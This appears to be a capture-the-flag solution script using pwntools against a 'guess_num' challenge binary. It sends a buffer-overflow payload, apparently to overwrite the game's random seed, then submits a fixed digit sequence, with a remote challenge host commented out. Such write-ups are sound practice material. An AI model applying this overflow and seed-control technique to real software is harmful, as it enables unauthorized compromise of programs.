from pwn import *
# p = remote("220.249.52.133",53230)
p = process("./guess_num")
context.log_level = 'debug'
payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
p.sendline(payload)
str1 = "5646623622"
for i in str1:
    p.sendline(i)
p.interactive()
